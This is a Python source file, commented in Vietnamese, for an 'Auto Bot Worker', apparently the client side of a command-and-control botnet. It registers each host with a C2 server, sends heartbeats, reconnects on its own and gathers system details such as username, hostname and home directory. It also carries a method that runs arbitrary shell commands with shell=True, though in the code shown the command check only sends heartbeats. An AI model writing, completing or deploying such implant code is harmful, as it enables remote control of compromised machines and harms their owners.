#!/usr/bin/env python3
"""
Universal Bot Worker - Auto System
100% Tự động hóa: Auto-reconnect, Auto-retry, Auto-recovery
Tương thích: Linux, Windows, macOS, Docker, VPS, Google Cloud Shell
"""

import os
import sys
import json
import time
import uuid
import platform
import subprocess
import threading
import requests
import logging
import signal
import atexit
from datetime import datetime, timedelta

# Cấu hình logging tự động
def setup_logging():
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(f'{log_dir}/bot_worker_auto.log'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

logger = setup_logging()

# Cấu hình tự động
AUTO_CONFIG = {
    'auto_reconnect': True,
    'auto_retry': True,
    'auto_recovery': True,
    'max_reconnect_attempts': 10,
    'reconnect_delay': 30,
    'heartbeat_interval': 60,
    'command_check_interval': 10,
    'max_command_retries': 3,
    'command_timeout': 300
}

class AutoBotWorker:
    def __init__(self, c2_server_url, bot_name=None):
        self.c2_server_url = c2_server_url.rstrip('/')
        self.bot_name = bot_name or f"AutoBot-{platform.node()}"
        self.bot_id = str(uuid.uuid4())
        self.running = False
        self.connected = False
        self.session = requests.Session()
        
        # Cấu hình session
        self.session.timeout = 30
        self.session.headers.update({
            'User-Agent': f'AutoBotWorker/2.0 ({platform.system()})'
        })
        
        # Auto-recovery variables
        self.reconnect_count = 0
        self.last_successful_connection = None
        self.connection_failures = 0
        self.max_failures = 5
        
        # Thông tin hệ thống
        self.system_info = self.get_system_info()
        
        # Threads
        self.heartbeat_thread = None
        self.command_thread = None
        self.monitor_thread = None
        
        logger.info(f"Auto Bot Worker initialized: {self.bot_name}")
        logger.info(f"Bot ID: {self.bot_id}")
        logger.info(f"C2 Server: {self.c2_server_url}")
        logger.info(f"Platform: {platform.system()} {platform.release()}")
        logger.info(f"Auto-recovery: ENABLED")
        logger.info(f"Auto-reconnect: ENABLED")
        logger.info(f"Auto-retry: ENABLED")
    
    def get_system_info(self):
        """Lấy thông tin hệ thống chi tiết"""
        try:
            info = {
                'platform': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'python_version': sys.version,
                'hostname': platform.node(),
                'username': os.getenv('USERNAME') or os.getenv('USER') or 'Unknown',
                'home_dir': os.path.expanduser('~'),
                'current_dir': os.getcwd(),
                'python_executable': sys.executable
            }
            
            # Thêm thông tin Windows nếu cần
            if platform.system() == 'Windows':
                try:
                    import winreg
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
                        info['windows_version'] = winreg.QueryValueEx(key, "ProductName")[0]
                except:
                    info['windows_version'] = 'Unknown'
            
            return info
        except Exception as e:
            logger.error(f"Error getting system info: {e}")
            return {'platform': platform.system(), 'error': str(e)}
    
    def register_with_server(self):
        """Đăng ký với C2 server"""
        try:
            data = {
                'bot_id': self.bot_id,
                'name': self.bot_name,
                'os_info': f"{self.system_info['platform']} {self.system_info['release']}",
                'version': '2.0',
                'capabilities': 'auto-recovery,auto-reconnect,command-execution'
            }
            
            response = self.session.post(f"{self.c2_server_url}/bot/register", json=data, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    self.connected = True
                    self.last_successful_connection = datetime.now()
                    self.connection_failures = 0
                    self.reconnect_count = 0
                    logger.info(f"Successfully registered with C2 server")
                    return True
                else:
                    logger.error(f"Registration failed: {result.get('message')}")
                    return False
            else:
                logger.error(f"Registration failed with status code: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Network error during registration: {e}")
            self.connection_failures += 1
            return False
        except Exception as e:
            logger.error(f"Registration error: {e}")
            return False
    
    def send_heartbeat(self):
        """Gửi heartbeat đến server"""
        try:
            data = {'bot_id': self.bot_id}
            response = self.session.post(f"{self.c2_server_url}/bot/heartbeat", json=data, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    self.connected = True
                    self.last_successful_connection = datetime.now()
                    return True
                else:
                    logger.warning(f"Heartbeat failed: {result.get('message')}")
                    return False
            else:
                logger.warning(f"Heartbeat failed with status code: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Network error during heartbeat: {e}")
            self.connected = False
            return False
        except Exception as e:
            logger.error(f"Heartbeat error: {e}")
            return False
    
    def check_commands(self):
        """Kiểm tra commands từ server"""
        try:
            # Đơn giản hóa: chỉ gửi heartbeat và kiểm tra kết nối
            if not self.send_heartbeat():
                logger.warning("Lost connection to server")
                self.connected = False
                return False
            
            return True
            
        except Exception as e:
            logger.error(f"Command check error: {e}")
            return False
    
    def execute_command(self, command):
        """Thực thi command"""
        try:
            logger.info(f"Executing command: {command}")
            
            # Thực thi command
            if platform.system() == 'Windows':
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=AUTO_CONFIG['command_timeout'])
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=AUTO_CONFIG['command_timeout'])
            
            output = result.stdout
            error = result.stderr
            success = result.returncode == 0
            
            if success:
                logger.info(f"Command executed successfully")
                if output:
                    logger.info(f"Output: {output[:200]}...")
            else:
                logger.warning(f"Command failed with return code: {result.returncode}")
                if error:
                    logger.warning(f"Error: {error[:200]}...")
            
            return {
                'success': success,
                'output': output,
                'error': error,
                'return_code': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            logger.error(f"Command timed out: {command}")
            return {
                'success': False,
                'output': '',
                'error': 'Command timed out',
                'return_code': -1
            }
        except Exception as e:
            logger.error(f"Command execution error: {e}")
            return {
                'success': False,
                'output': '',
                'error': str(e),
                'return_code': -1
            }
    
    def heartbeat_loop(self):
        """Loop gửi heartbeat"""
        while self.running:
            try:
                if not self.send_heartbeat():
                    logger.warning("Heartbeat failed, attempting reconnection...")
                    self.attempt_reconnection()
                
                time.sleep(AUTO_CONFIG['heartbeat_interval'])
            except Exception as e:
                logger.error(f"Heartbeat loop error: {e}")
                time.sleep(10)
    
    def command_loop(self):
        """Loop kiểm tra commands"""
        while self.running:
            try:
                if not self.check_commands():
                    logger.warning("Command check failed")
                    time.sleep(AUTO_CONFIG['command_check_interval'])
                    continue
                
                time.sleep(AUTO_CONFIG['command_check_interval'])
            except Exception as e:
                logger.error(f"Command loop error: {e}")
                time.sleep(10)
    
    def monitor_loop(self):
        """Loop giám sát hệ thống"""
        while self.running:
            try:
                # Kiểm tra health của bot
                self.check_health()
                time.sleep(60)  # Check every minute
            except Exception as e:
                logger.error(f"Monitor loop error: {e}")
                time.sleep(30)
    
    def check_health(self):
        """Kiểm tra health của bot"""
        try:
            # Kiểm tra memory usage
            try:
                import psutil
                if hasattr(psutil, 'virtual_memory'):
                    memory = psutil.virtual_memory()
                    if memory.percent > 90:
                        logger.warning(f"High memory usage: {memory.percent}%")
            except ImportError:
                pass
            
            # Kiểm tra disk usage
            try:
                import psutil
                if platform.system() == 'Windows':
                    disk = psutil.disk_usage('C:\\')
                else:
                    disk = psutil.disk_usage('/')
                if disk.percent > 90:
                    logger.warning(f"High disk usage: {disk.percent}%")
            except:
                pass
            
            # Kiểm tra kết nối mạng
            if not self.connected:
                logger.warning("Bot is disconnected from server")
                
        except Exception as e:
            logger.error(f"Health check error: {e}")
    
    def attempt_reconnection(self):
        """Thử kết nối lại"""
        if self.reconnect_count >= AUTO_CONFIG['max_reconnect_attempts']:
            logger.error("Max reconnection attempts reached")
            return False
        
        self.reconnect_count += 1
        logger.info(f"Attempting reconnection #{self.reconnect_count}")
        
        try:
            # Thử đăng ký lại
            if self.register_with_server():
                logger.info("Reconnection successful")
                return True
            else:
                logger.warning(f"Reconnection attempt #{self.reconnect_count} failed")
                time.sleep(AUTO_CONFIG['reconnect_delay'])
                return False
                
        except Exception as e:
            logger.error(f"Reconnection error: {e}")
            time.sleep(AUTO_CONFIG['reconnect_delay'])
            return False
    
    def start(self):
        """Khởi động bot worker"""
        if self.running:
            logger.warning("Bot worker is already running")
            return
        
        try:
            logger.info("Starting Auto Bot Worker...")
            
            # Đăng ký với server
            if not self.register_with_server():
                logger.error("Failed to register with server")
                return False
            
            self.running = True
            
            # Khởi động các threads
            self.heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
            self.command_thread = threading.Thread(target=self.command_loop, daemon=True)
            self.monitor_thread = threading.Thread(target=self.monitor_loop, daemon=True)
            
            self.heartbeat_thread.start()
            self.command_thread.start()
            self.monitor_thread.start()
            
            logger.info("Auto Bot Worker started successfully")
            logger.info(f"Bot ID: {self.bot_id}")
            logger.info(f"Connected to: {self.c2_server_url}")
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start bot worker: {e}")
            return False
    
    def stop(self):
        """Dừng bot worker"""
        if not self.running:
            return
        
        logger.info("Stopping Auto Bot Worker...")
        self.running = False
        
        # Đợi threads kết thúc
        if self.heartbeat_thread:
            self.heartbeat_thread.join(timeout=5)
        if self.command_thread:
            self.command_thread.join(timeout=5)
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        
        logger.info("Auto Bot Worker stopped")
    
    def cleanup(self):
        """Dọn dẹp resources"""
        try:
            self.stop()
            
            # Gửi disconnect notification
            if self.connected:
                try:
                    data = {'bot_id': self.bot_id}
                    self.session.post(f"{self.c2_server_url}/bot/disconnect", json=data, timeout=5)
                except:
                    pass
            
            logger.info("Cleanup completed")
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}")

def main():
    """Main function"""
    import argparse
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='Auto Bot Worker for C2 Server')
    parser.add_argument('--server', '-s', 
                       help='C2 Server URL (default: http://localhost:5000)',
                       default='http://localhost:5000')
    parser.add_argument('--name', '-n',
                       help='Bot name (default: auto-generated)',
                       default=None)
    parser.add_argument('--port', '-p',
                       help='C2 Server port (default: 5000)',
                       type=int, default=5000)
    
    args = parser.parse_args()
    
    # Cấu hình C2 server URL
    c2_server_url = args.server
    if not c2_server_url.startswith(('http://', 'https://')):
        c2_server_url = f"http://{c2_server_url}"
    
    # Nếu chỉ có IP, thêm port
    if ':' not in c2_server_url.split('//')[1]:
        c2_server_url = f"{c2_server_url}:{args.port}"
    
    bot_name = args.name or os.environ.get('BOT_NAME', None)
    
    # Tạo bot worker
    bot_worker = AutoBotWorker(c2_server_url, bot_name)
    
    # Signal handlers
    def signal_handler(signum, frame):
        logger.info(f"Received signal {signum}")
        bot_worker.cleanup()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    atexit.register(bot_worker.cleanup)
    
    try:
        # Khởi động bot worker
        if bot_worker.start():
            logger.info("Bot worker is running. Press Ctrl+C to stop.")
            
            # Giữ main thread alive
            while bot_worker.running:
                time.sleep(1)
                
        else:
            logger.error("Failed to start bot worker")
            sys.exit(1)
            
    except KeyboardInterrupt:
        logger.info("Received keyboard interrupt")
        bot_worker.cleanup()
    except Exception as e:
        logger.error(f"Main error: {e}")
        bot_worker.cleanup()
        sys.exit(1)

if __name__ == '__main__':
    main()
